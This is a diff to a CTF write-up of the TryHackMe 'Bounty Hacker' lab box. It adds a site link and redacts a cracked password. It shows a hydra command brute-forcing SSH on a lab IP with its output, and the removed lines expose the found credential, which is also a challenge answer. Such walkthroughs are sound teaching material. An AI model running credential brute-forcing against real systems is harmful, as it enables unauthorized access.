@@ -8,8 +8,9 @@ asciinema: true
 
 This challenge is a straightforward Linux box involving simple enumeration, credential bruteforcing and abusing user `sudo` privileges on an unsafe binary.
 
----
+*Visit [TryHackMe](https://tryhackme.com) for more challenges*
 
+---
 # Initial reconnaissance
 
 ## Enumerating running services
@@ -124,7 +125,7 @@ redeye
 
 # Brute-forcing SSH
 
-There are a few ways to go abount bruteforcing access to `ssh`, one commonly used tool to perform such tasks is `hydra` !(https://github.com/vanhauser-thc/thc-hydra)
+There are a few ways to go abount bruteforcing access to `ssh`, one commonly used tool to perform such tasks is `hydra` (https://github.com/vanhauser-thc/thc-hydra)
 
 ```
 kali@kali:/mnt/hgfs/TryHackMe/bounty-hunter$ hydra -L potential-users.txt -P locks.txt ssh://10.10.21
@@ -135,12 +136,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 23:30:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 208 login tries (l:8/p:26), ~13 tries per task
 [DATA] attacking ssh://10.10.211.186:22/
-[22][ssh] host: 10.10.211.186   login: lin   password: RedDr4gonSynd1cat3
+[22][ssh] host: 10.10.211.186   login: lin   password: REDACTED
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 23:31:51
 ```
 
-We found a valid SSH credential `lin:RedDr4gonSynd1cat3`, this will answer Task 4.
+We found a valid SSH credential `lin:REDACTED`, this will answer Task 4.
 
 # Accessing the machine
 
